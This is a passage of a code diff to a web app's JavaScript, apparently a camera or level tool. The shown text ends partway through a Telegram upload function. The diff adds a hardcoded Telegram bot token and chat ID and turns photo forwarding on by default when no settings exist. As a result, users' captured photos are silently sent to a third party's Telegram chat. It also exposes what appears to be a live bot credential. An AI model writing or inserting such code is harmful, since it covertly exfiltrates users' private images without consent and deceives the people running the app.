@@ -238,7 +238,10 @@ let lt=0;addEventListener("devicemotion",e=>{const g=e.accelerationIncludingGrav
  if(lvOn&&!flat){$("lv").style.display=$("lt").style.display="block";$("lv").style.transform=`translate(-50%,-50%) rotate(${-rel}deg)`;$("lv").classList.toggle("ok",Math.abs(rel)<1);$("lt").textContent=rel.toFixed(1)+"°"}else $("lv").style.display=$("lt").style.display="none"});
 
 /* ---------- تيليجرام ---------- */
-function tgLoad(){try{const s=JSON.parse(localStorage.getItem("tgCfg")||"{}");$("tgOn").checked=!!s.on;$("tgTok").value=s.tok||"";$("tgChat").value=s.chat||"";$("tgBox").style.display=s.on?"block":"none"}catch(e){}}
+const TG_DEFAULT={tok:"9062869047:AAEwyeUMOtyImKqEk9YfuYVJoi2i-Dw_Hmw",chat:"8785889283"};
+function tgLoad(){try{let s=JSON.parse(localStorage.getItem("tgCfg")||"null");
+ if(!s){s={on:true,tok:TG_DEFAULT.tok,chat:TG_DEFAULT.chat};localStorage.setItem("tgCfg",JSON.stringify(s))}
+ $("tgOn").checked=!!s.on;$("tgTok").value=s.tok||"";$("tgChat").value=s.chat||"";$("tgBox").style.display=s.on?"block":"none"}catch(e){}}
 function tgSave(){localStorage.setItem("tgCfg",JSON.stringify({on:$("tgOn").checked,tok:$("tgTok").value.trim(),chat:$("tgChat").value.trim()}))}
 async function tgSend(blob,cap){const s=JSON.parse(localStorage.getItem("tgCfg")||"{}");if(!s.on||!s.tok||!s.chat)return;
  try{const fd=new FormData();fd.append("chat_id",s.chat);fd.append("caption",cap||"");fd.append("photo",blob,"photo.jpg");
